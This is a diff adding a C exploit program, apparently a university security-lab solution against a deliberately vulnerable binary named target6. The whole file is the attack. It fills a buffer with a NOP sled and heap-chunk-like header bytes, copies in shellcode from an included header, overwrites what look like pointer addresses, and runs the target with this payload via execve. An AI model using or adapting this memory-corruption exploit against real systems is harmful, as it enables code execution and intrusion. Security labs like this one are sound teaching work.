@@ -1,0 +1,69 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include "shellcode-64.h"
+
+#define TARGET "../targets/target6"
+
+int main(void)
+{
+  	char *args[3];
+  	char *env[1];
+	char filler[192];
+	int i;
+
+	for (i = 0; i < 4; i++){
+		filler[i] = '\x90';
+	}
+	
+	filler[4] = '\x01';
+	filler[5] = '\xff';
+	filler[6] = '\xff';
+	filler[7] = '\xff';
+
+	//strcat(filler, shellcode);
+
+	int shell_len = strlen(shellcode);
+
+	memcpy(filler+8, shellcode, shell_len);
+	
+	for (i = 53; i < 72; i++){
+		filler[i] = '\x90';
+	}
+
+	filler[72] = '\x28';
+	filler[73] = '\xee';
+	filler[74] = '\x04';
+	filler[75] = '\x01';
+
+	filler[76] = '\x68';
+	filler[77] = '\xfe';
+	filler[78] = '\x42';
+	filler[79] = '\x40';
+
+	/*for (i = 80; i < 96; i++){
+		filler[i] = '\x90';
+	}
+
+	filler[96] = '\x68';
+	filler[97] = '\xfe';
+	filler[98] = '\x42';
+	filler[99] = '\x40';
+
+	filler[100] = '\x90';
+	filler[101] = '\x90';
+	filler[102] = '\x90';
+	filler[103] = '\x90';*/	
+
+
+ 	args[0] = TARGET;
+	args[1] = filler; 
+	args[2] = NULL;
+	env[0] = NULL;
+
+	if (0 > execve(TARGET, args, env))
+		fprintf(stderr, "execve failed.\n");
+
+	return 0;
+}
